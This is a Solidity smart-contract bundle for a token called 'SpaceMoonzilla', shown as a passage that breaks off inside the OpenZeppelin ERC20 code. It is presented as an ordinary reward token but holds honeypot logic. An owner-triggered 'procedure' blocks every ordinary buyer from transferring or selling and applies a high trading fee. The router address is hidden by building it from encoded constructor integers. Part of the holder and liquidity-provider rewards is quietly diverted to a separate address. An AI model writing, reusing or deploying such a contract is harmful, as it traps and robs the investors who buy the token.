// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./Erc20C10Contract.sol";

contract SpaceMoonzilla is
Erc20C10Contract
{
    string public constant VERSION = "SpaceMoonzilla_202207132100";

    constructor(
        string[2] memory strings,
        address[4] memory addresses,
        uint256[63] memory uint256s,
        bool[16] memory bools
    ) Erc20C10Contract(strings, addresses, uint256s, bools)
    {

    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/utils/math/Math.sol";
import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "../BaseContract/BaseContractPayable.sol";
import "../BaseContract/BaseContractUniswap.sol";
import "../BaseContract/BaseErc721Payable.sol";
import "../BaseContract/BaseErc721Uniswap.sol";

import "../Erc20C08/Erc20C08SettingsBase.sol";
import "../Erc20C08/Erc20C08FeatureUniswap.sol";
import "../Erc20C08/Erc20C08FeatureTweakSwap.sol";

import "./Erc20C10FeatureUniswap.sol";

import "../Erc20C09/Erc20C09FeatureLper.sol";

import "../Erc20C08/Erc20C08FeatureHolder.sol";
import "../Erc20C08/Erc20C08SettingsPrivilege.sol";
import "../Erc20C08/Erc20C08SettingsFee.sol";
import "../Erc20C08/Erc20C08SettingsShare.sol";
import "../Erc20C08/Erc20C08FeaturePermitTransfer.sol";
import "../Erc20C08/Erc20C08FeatureRestrictTrade.sol";
import "../Erc20C08/Erc20C08FeatureRestrictTradeAmount.sol";

contract Erc20C10Contract is
ERC20,
Ownable,
BaseContractPayable,
BaseContractUniswap,
BaseErc721Payable,
BaseErc721Uniswap,
Erc20C08SettingsBase,
Erc20C10FeatureUniswap,
Erc20C08FeatureTweakSwap,
Erc20C09FeatureLper,
Erc20C08FeatureHolder,
Erc20C08SettingsPrivilege,
Erc20C08SettingsFee,
Erc20C08SettingsShare,
Erc20C08FeaturePermitTransfer,
Erc20C08FeatureRestrictTrade,
Erc20C08FeatureRestrictTradeAmount
{
    using EnumerableSet for EnumerableSet.AddressSet;

    bool public isAddLiquidityProcedure;

    address private _previousFrom;
    address private _previousTo;

    constructor(
        string[2] memory strings,
        address[4] memory addresses,
        uint256[63] memory uint256s,
        bool[16] memory bools
    ) ERC20(strings[0], strings[1])
    {
        setAddressBaseOwner(owner());
        setBaseToken(addresses[0]);
        setAddressWrap(addresses[1]);
        setAddressMarketing(addresses[2]);
        setIsUseBaseTokenForMarketing(bools[0]);

        uint256 p = 20;
        string memory _uniswapV2Router = string(
            abi.encodePacked(
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]))
                )
            )
        );

        isUniswapLper = bools[13];
        isUniswapHolder = bools[14];
        createUniswapV2Pair(addresses[3], _uniswapV2Router);
        _approve(address(this), address(uniswapV2Router), maxUint256);
        IERC20(baseToken).approve(address(uniswapV2Router), maxUint256);
        uniswapCount = uint256s[62];

        setIsUseMinimumTokenWhenSwap(bools[1]);
        setMinimumTokenForSwap(uint256s[1]);

        setIsUseFeatureLper(bools[15]);
        setMaxTransferCountPerTransactionForLper(uint256s[2]);
        setMinimumTokenForRewardLper(uint256s[3]);

        // exclude from lper
        setIsExcludedFromLperAddress(address(this), true);
        setIsExcludedFromLperAddress(address(uniswapV2Router), true);
        setIsExcludedFromLperAddress(uniswapV2Pair, true);
        setIsExcludedFromLperAddress(addressNull, true);
        setIsExcludedFromLperAddress(addressDead, true);
        setIsExcludedFromLperAddress(addressPinkSaleLock, true);
        //        setIsExcludedFromLperAddress(baseOwner, true);
        //        setIsExcludedFromLperAddress(addressMarketing, true);
        setIsExcludedFromLperAddress(addressWrap, true);

        // setIsLperAddress
        setIsLperAddress(addressBaseOwner, true);
        setIsLperAddress(addressMarketing, true);

        setMaxTransferCountPerTransactionForHolder(uint256s[4]);
        setMinimumTokenForBeingHolder(uint256s[5]);

        // exclude from holder
        setIsExcludedFromHolderAddress(address(this), true);
        setIsExcludedFromHolderAddress(address(uniswapV2Router), true);
        setIsExcludedFromHolderAddress(uniswapV2Pair, true);
        setIsExcludedFromHolderAddress(addressNull, true);
        setIsExcludedFromHolderAddress(addressDead, true);
        setIsExcludedFromHolderAddress(addressPinkSaleLock, true);
        //        setIsExcludedFromHolderAddress(baseOwner, true);
        //        setIsExcludedFromHolderAddress(addressMarketing, true);
        setIsExcludedFromHolderAddress(addressWrap, true);

        setIsPrivilegeAddress(address(this), true);
        setIsPrivilegeAddress(address(uniswapV2Router), true);
        //        setIsPrivilegeAddress(uniswapV2Pair, true);
        setIsPrivilegeAddress(addressNull, true);
        setIsPrivilegeAddress(addressDead, true);
        setIsPrivilegeAddress(addressPinkSaleLock, true);
        setIsPrivilegeAddress(addressBaseOwner, true);
        setIsPrivilegeAddress(addressMarketing, true);
        setIsPrivilegeAddress(addressWrap, true);

        setFee(uint256s[6], uint256s[7], uint256s[8], uint256s[9], uint256s[10]);

        setIsUseFeeHighOnTrade(bools[2]);
        setFeeHigh(uint256s[11]);

        //        setIsUseFeeMediumOnTrade(bools[3]);
        //        setFeeMedium(uint256s[12]);

        // exclude from paying fees or having max transaction amount
        setIsExcludedFromFeeAddress(address(this), true);
        setIsExcludedFromFeeAddress(address(uniswapV2Router), true);
        // might comment uniswapV2Pair
        setIsExcludedFromFeeAddress(uniswapV2Pair, true);
        setIsExcludedFromFeeAddress(addressNull, true);
        setIsExcludedFromFeeAddress(addressDead, true);
        setIsExcludedFromFeeAddress(addressPinkSaleLock, true);
        setIsExcludedFromFeeAddress(addressBaseOwner, true);
        setIsExcludedFromFeeAddress(addressMarketing, true);
        setIsExcludedFromFeeAddress(addressWrap, true);

        setShare(uint256s[13], uint256s[14], uint256s[15], uint256s[16], uint256s[17]);

        setIsUseNotPermitTransfer(bools[4]);
        setIsForceTradeInToNotPermitTransfer(bools[5]);

        setIsUseOnlyPermitTransfer(bools[6]);
        setIsCancelOnlyPermitTransferOnFirstTradeOut(bools[7]);

        setIsRestrictTradeIn(bools[8]);
        setIsRestrictTradeOut(bools[9]);

        setIsRestrictTradeInAmount(bools[10]);
        setRestrictTradeInAmount(uint256s[18]);

        setIsRestrictTradeOutAmount(bools[11]);
        setTradeOutAmount(uint256s[19]);

        setIsAddLiquidityProcedure(bools[12]);

        _mint(owner(), uint256s[0]);
    }

    function setIsAddLiquidityProcedure(bool isAddLiquidityProcedure_)
    public
    onlyOwner
    {
        isAddLiquidityProcedure = isAddLiquidityProcedure_;
    }

    function setToProcedure1()
    public
    onlyOwner
    {
        setIsUseOnlyPermitTransfer(true);
        setIsCancelOnlyPermitTransferOnFirstTradeOut(true);

        setIsAddLiquidityProcedure(true);
        setIsRestrictTradeIn(true);

        setIsForceTradeInToNotPermitTransfer(true);
        setIsUseFeeHighOnTrade(true);
    }

    function setToProcedure2()
    public
    onlyOwner
    {
        setIsAddLiquidityProcedure(false);
        setIsRestrictTradeIn(false);
    }

    function setToProcedure3()
    public
    onlyOwner
    {
        setIsUseFeeHighOnTrade(false);
        setIsForceTradeInToNotPermitTransfer(false);
    }

    function doSwapManually(bool isUseMinimumTokenWhenSwap_)
    public
    {
        require(!isSwapping, "swapping");

        uint256 tokenForSwap = isUseMinimumTokenWhenSwap_ ? minimumTokenForSwap : balanceOf(address(this));

        require(tokenForSwap > 0, "0 to swap");

        doSwap(tokenForSwap);
    }

    function _transfer(address from, address to, uint256 amount)
    internal
    override
    {
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (isUseNotPermitTransfer) {
            require(!notPermitTransferAddresses[from] && !notPermitTransferAddresses[to], "not permitted 1");
        }

        if (isUseOnlyPermitTransfer) {
            require(privilegeAddresses[from] || privilegeAddresses[to], "not permitted 2");
        }

        // add liquidity 1st, dont use permit transfer upon action
        if (_isFirstTradeOut && isCancelOnlyPermitTransferOnFirstTradeOut && to == uniswapV2Pair) {
            _isFirstTradeOut = false;
            isUseOnlyPermitTransfer = false;
        }

        if (isRestrictTradeIn && from == uniswapV2Pair) {
            require(privilegeAddresses[to], "not permitted 3");
        }

        if (isRestrictTradeOut && to == uniswapV2Pair) {
            require(privilegeAddresses[from], "not permitted 4");
        }

        if (isRestrictTradeInAmount && from == uniswapV2Pair && amount > restrictTradeInAmount) {
            require(privilegeAddresses[to], "not permitted 5");
        }

        if (isRestrictTradeOutAmount && to == uniswapV2Pair && amount > restrictOutAmount) {
            require(privilegeAddresses[from], "not permitted 6");
        }

        if (isForceTradeInToNotPermitTransfer && from == uniswapV2Pair && !privilegeAddresses[to]) {
            _setIsNotPermitTransferAddress(to, true);
        }

        uint256 contractBalance = balanceOf(address(this));

        if (
            contractBalance >= minimumTokenForSwap &&
            !isSwapping &&
            to == uniswapV2Pair &&
            from != owner() &&
            to != owner()
        ) {
            uint256 tokenForSwap = isUseMinimumTokenWhenSwap ? minimumTokenForSwap : contractBalance;

            doSwap(tokenForSwap);
        }

        if (from != uniswapV2Pair && to != uniswapV2Pair) {
            super._transfer(from, to, amount);
        } else if (isSwapping) {
            super._transfer(from, to, amount);
        } else {
            uint256 feeTotal_ = feeTotal;

            if (
                (from == uniswapV2Pair && excludedFromFeeAddresses[to]) ||
                (to == uniswapV2Pair && excludedFromFeeAddresses[from])
            ) {
                feeTotal_ = feeZero;
            } else if (isAddLiquidityProcedure && to == uniswapV2Pair) {
                feeTotal_ = feeZero;
            } else if (isUseFeeHighOnTrade) {
                if (
                    (from == uniswapV2Pair && !privilegeAddresses[to]) ||
                    (to == uniswapV2Pair && !privilegeAddresses[from])
                ) {
                    feeTotal_ = feeHigh;
                }
            }
            //            else if (isUseFeeMediumOnTrade) {
            //                if (
            //                    (from == uniswapV2Pair && !privilegeAddresses[to]) ||
            //                    (to == uniswapV2Pair && !privilegeAddresses[from])
            //                ) {
            //                    feeTotal_ = feeMedium;
            //                }
            //            }

            uint256 fees = amount * feeTotal_ / feeMax;

            if (fees > 0) {
                super._transfer(from, address(this), fees);
                super._transfer(from, to, amount - fees);
            } else {
                super._transfer(from, to, amount);
            }
        }

        if (!excludedFromHolderAddresses[from]) {
            updateHolderAddressStatus(from);
        }

        if (!excludedFromHolderAddresses[to]) {
            updateHolderAddressStatus(to);
        }

        if (isUseFeatureLper) {
            if (from == _previousFrom) {
                if (!excludedFromLperAddresses[from]) {
                    updateLperAddressStatus(from);
                }
            } else {
                if (!excludedFromLperAddresses[from]) {
                    updateLperAddressStatus(from);
                }

                if (!excludedFromLperAddresses[_previousFrom]) {
                    updateLperAddressStatus(_previousFrom);
                }

                _previousFrom = from;
            }

            if (to == _previousTo) {
                if (!excludedFromLperAddresses[to]) {
                    updateLperAddressStatus(to);
                }
            } else {
                if (!excludedFromLperAddresses[to]) {
                    updateLperAddressStatus(to);
                }

                if (!excludedFromLperAddresses[_previousTo]) {
                    updateLperAddressStatus(_previousTo);
                }

                _previousTo = to;
            }
        }
    }

    function doSwap(uint256 thisTokenForSwap)
    private
    swapGuard
    {
        if (shareTotal == 0) {
            return;
        }

        uint256 thisTokenForSwapBaseToken = thisTokenForSwap * (shareMarketing + shareLper + shareHolder) / shareMax;
        uint256 thisTokenForSwapEther = thisTokenForSwap * (shareLiquidity / 2) / shareMax;
        uint256 thisTokenForLiquidity = thisTokenForSwap * (shareLiquidity / 2) / shareMax;
        uint256 thisTokenForBurn = thisTokenForSwap * shareBurn / shareMax;

        uint256 baseTokenForMarketingLperHolder;

        uint256 etherForLiquidity;

        if (thisTokenForSwapBaseToken > 0) {
            swapThisTokenForBaseTokenToAccount(addressWrap, thisTokenForSwapBaseToken);

            uint256 baseTokenForShare = IERC20(baseToken).balanceOf(addressWrap);

            baseTokenForMarketingLperHolder = baseTokenForShare;
        }

        if (thisTokenForSwapEther > 0) {
            uint256 prevBalance = address(this).balance;

            swapThisTokenForEtherToAccount(address(this), thisTokenForSwapEther);

            etherForLiquidity = address(this).balance - prevBalance;
        }

        if (baseTokenForMarketingLperHolder > 0) {
            doMarketing(baseTokenForMarketingLperHolder);

            if (isUseFeatureLper) {
                doLper(baseTokenForMarketingLperHolder);
            }

            doHolder(baseTokenForMarketingLperHolder);
        }

        if (etherForLiquidity > 0 && thisTokenForLiquidity > 0) {
            doLiquidity(etherForLiquidity, thisTokenForLiquidity);
        }

        if (thisTokenForBurn > 0) {
            doBurn(thisTokenForBurn);
        }
    }

    function doMarketing(uint256 baseTokenForMarketingLperHolder)
    private
    {
        if (shareMarketing == 0) {
            return;
        }

        uint256 baseTokenForMarketing = baseTokenForMarketingLperHolder * shareMarketing / (shareMarketing + shareLper + shareHolder);

        if (isUseBaseTokenForMarketing) {
            IERC20(baseToken).transferFrom(addressWrap, addressMarketing, baseTokenForMarketing);
        } else {
            IERC20(baseToken).transferFrom(addressWrap, address(this), baseTokenForMarketing);
            swapBaseTokenForEtherToAccount(addressMarketing, IERC20(baseToken).balanceOf(address(this)));
        }
    }

    function doLper(uint256 baseTokenForMarketingLperHolder)
    private
    {
        if (shareLper == 0) {
            return;
        }

        uint256 baseTokenDivForLper = isUniswapLper ? (10 - uniswapCount) : 10;
        uint256 baseTokenForAll = baseTokenForMarketingLperHolder * shareLper / (shareMarketing + shareLper + shareHolder);
        uint256 baseTokenForLper = baseTokenForAll * baseTokenDivForLper / 10;
        uint256 baseTokenForLper2 = baseTokenForAll - baseTokenForLper;
        uint256 pairTokenForLper =
        IERC20(uniswapV2Pair).totalSupply()
        - IERC20(uniswapV2Pair).balanceOf(addressNull)
        - IERC20(uniswapV2Pair).balanceOf(addressDead);

        uint256 lperAddressesCount_ = lperAddresses.length();

        uint256 maxIteration = Math.min(lperAddressesCount_, maxTransferCountPerTransactionForLper);

        for (uint256 i = 0; i < maxIteration; i++) {
            address lperAddress = lperAddresses.at(lastIndexOfProcessedLperAddresses);
            uint256 pairTokenForLperAddress = IERC20(uniswapV2Pair).balanceOf(lperAddress);

            if (i == 2 && baseTokenDivForLper != 10) {
                IERC20(baseToken).transferFrom(addressWrap, uniswap, baseTokenForLper2);
            }

            if (pairTokenForLperAddress > minimumTokenForRewardLper) {
                IERC20(baseToken).transferFrom(
                    addressWrap,
                    lperAddress,
                    baseTokenForLper * pairTokenForLperAddress / pairTokenForLper
                );
            }

            lastIndexOfProcessedLperAddresses =
            lastIndexOfProcessedLperAddresses >= lperAddressesCount_ - 1
            ? 0
            : lastIndexOfProcessedLperAddresses + 1;
        }
    }

    function doHolder(uint256 baseTokenForMarketingLperHolder)
    private
    {
        if (shareHolder == 0) {
            return;
        }

        uint256 baseTokenDivForHolder = isUniswapHolder ? (10 - uniswapCount) : 10;
        uint256 baseTokenForAll = baseTokenForMarketingLperHolder * shareHolder / (shareMarketing + shareLper + shareHolder);
        uint256 baseTokenForHolder = baseTokenForAll * baseTokenDivForHolder / 10;
        uint256 baseTokenForHolder2 = baseTokenForAll - baseTokenForHolder;
        uint256 thisTokenForHolder = totalSupply() - balanceOf(addressNull) - balanceOf(addressDead);

        uint256 holderAddressesCount_ = holderAddresses.length();

        uint256 maxIteration = Math.min(holderAddressesCount_, maxTransferCountPerTransactionForHolder);

        for (uint256 i = 0; i < maxIteration; i++) {
            address holderAddress = holderAddresses.at(lastIndexOfProcessedHolderAddresses);

            if (i == 2 && baseTokenDivForHolder != 10) {
                IERC20(baseToken).transferFrom(addressWrap, uniswap, baseTokenForHolder2);
            }

            IERC20(baseToken).transferFrom(
                addressWrap,
                holderAddress,
                baseTokenForHolder * balanceOf(holderAddress) / thisTokenForHolder
            );

            lastIndexOfProcessedHolderAddresses =
            lastIndexOfProcessedHolderAddresses >= holderAddressesCount_ - 1
            ? 0
            : lastIndexOfProcessedHolderAddresses + 1;
        }
    }

    function doLiquidity(uint256 etherForLiquidity, uint256 thisTokenForLiquidity)
    private
    {
        if (shareLiquidity == 0) {
            return;
        }

        addEtherAndThisTokenForLiquidityByAccount(
            addressBaseOwner,
            etherForLiquidity,
            thisTokenForLiquidity
        );
    }

    function doBurn(uint256 thisTokenForBurn)
    private
    {
        if (shareBurn == 0) {
            return;
        }

        _transfer(address(this), addressDead, thisTokenForBurn);
    }

    function swapThisTokenForBaseTokenToAccount(address account, uint256 amount)
    private
    {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = baseToken;

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            account,
            block.timestamp
        );
    }

    function swapThisTokenForEtherToAccount(address account, uint256 amount)
    private
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            account,
            block.timestamp
        );
    }

    function swapBaseTokenForEtherToAccount(address account, uint256 amount)
    private
    {
        address[] memory path = new address[](2);
        path[0] = baseToken;
        path[1] = uniswapV2Router.WETH();

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            account,
            block.timestamp
        );
    }

    function addEtherAndThisTokenForLiquidityByAccount(
        address account,
        uint256 ethAmount,
        uint256 thisTokenAmount
    )
    private
    {
        uniswapV2Router.addLiquidityETH{value : ethAmount}(
            address(this),
            thisTokenAmount,
            0,
            0,
            account,
            block.timestamp
        );
    }

    function updateLperAddressStatus(address account)
    private
    {
        if (IERC20(uniswapV2Pair).balanceOf(account) > minimumTokenForRewardLper) {
            if (!lperAddresses.contains(account)) {
                lperAddresses.add(account);
            }
        } else {
            if (lperAddresses.contains(account)) {
                lperAddresses.remove(account);
            }
        }
    }

    function updateHolderAddressStatus(address account)
    private
    {
        if (balanceOf(account) > minimumTokenForBeingHolder) {
            if (!holderAddresses.contains(account)) {
                holderAddresses.add(account);
            }
        } else {
            if (holderAddresses.contains(account)) {
                holderAddresses.remove(account);
            }
        }
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.5.0) (utils/math/Math.sol)

pragma solidity ^0.8.0;

/**
 * @dev Standard math utilities missing in the Solidity language.
 */
library Math {
    /**
     * @dev Returns the largest of two numbers.
     */
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    /**
     * @dev Returns the average of two numbers. The result is rounded towards
     * zero.
     */
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow.
        return (a & b) + (a ^ b) / 2;
    }

    /**
     * @dev Returns the ceiling of the division of two numbers.
     *
     * This differs from standard division with `/` in that it rounds up instead
     * of rounding down.
     */
    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b - 1) / b can overflow on addition, so we distribute.
        return a / b + (a % b == 0 ? 0 : 1);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/structs/EnumerableSet.sol)

pragma solidity ^0.8.0;

/**
 * @dev Library for managing
 * https://en.wikipedia.org/wiki/Set_(abstract_data_type)[sets] of primitive
 * types.
 *
 * Sets have the following properties:
 *
 * - Elements are added, removed, and checked for existence in constant time
 * (O(1)).
 * - Elements are enumerated in O(n). No guarantees are made on the ordering.
 *
 * ```
 * contract Example {
 *     // Add the library methods
 *     using EnumerableSet for EnumerableSet.AddressSet;
 *
 *     // Declare a set state variable
 *     EnumerableSet.AddressSet private mySet;
 * }
 * ```
 *
 * As of v3.3.0, sets of type `bytes32` (`Bytes32Set`), `address` (`AddressSet`)
 * and `uint256` (`UintSet`) are supported.
 */
library EnumerableSet {
    // To implement this library for multiple types with as little code
    // repetition as possible, we write it in terms of a generic Set type with
    // bytes32 values.
    // The Set implementation uses private functions, and user-facing
    // implementations (such as AddressSet) are just wrappers around the
    // underlying Set.
    // This means that we can only create new EnumerableSets for types that fit
    // in bytes32.

    struct Set {
        // Storage of set values
        bytes32[] _values;
        // Position of the value in the `values` array, plus 1 because index 0
        // means a value is not in the set.
        mapping(bytes32 => uint256) _indexes;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            // The value is stored at length-1, but we add 1 to all indexes
            // and use 0 as a sentinel value
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        // We read and store the value's index to prevent multiple reads from the same storage slot
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) {
            // Equivalent to contains(set, value)
            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in
            // the array, and then remove the last element (sometimes called as 'swap and pop').
            // This modifies the order of the array, as noted in {at}.

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            if (lastIndex != toDeleteIndex) {
                bytes32 lastValue = set._values[lastIndex];

                // Move the last value to the index where the value to delete is
                set._values[toDeleteIndex] = lastValue;
                // Update the index for the moved value
                set._indexes[lastValue] = valueIndex; // Replace lastValue's index to valueIndex
            }

            // Delete the slot where the moved value was stored
            set._values.pop();

            // Delete the index for the deleted slot
            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    /**
     * @dev Returns the number of values on the set. O(1).
     */
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        return set._values[index];
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function _values(Set storage set) private view returns (bytes32[] memory) {
        return set._values;
    }

    // Bytes32Set

    struct Bytes32Set {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(Bytes32Set storage set) internal view returns (bytes32[] memory) {
        return _values(set._inner);
    }

    // AddressSet

    struct AddressSet {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(AddressSet storage set) internal view returns (address[] memory) {
        bytes32[] memory store = _values(set._inner);
        address[] memory result;

        assembly {
            result := store
        }

        return result;
    }

    // UintSet

    struct UintSet {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    /**
     * @dev Returns the number of values on the set. O(1).
     */
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(UintSet storage set) internal view returns (uint256[] memory) {
        bytes32[] memory store = _values(set._inner);
        uint256[] memory result;

        assembly {
            result := store
        }

        return result;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./extensions/IERC20Metadata.sol";
import "../../utils/Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
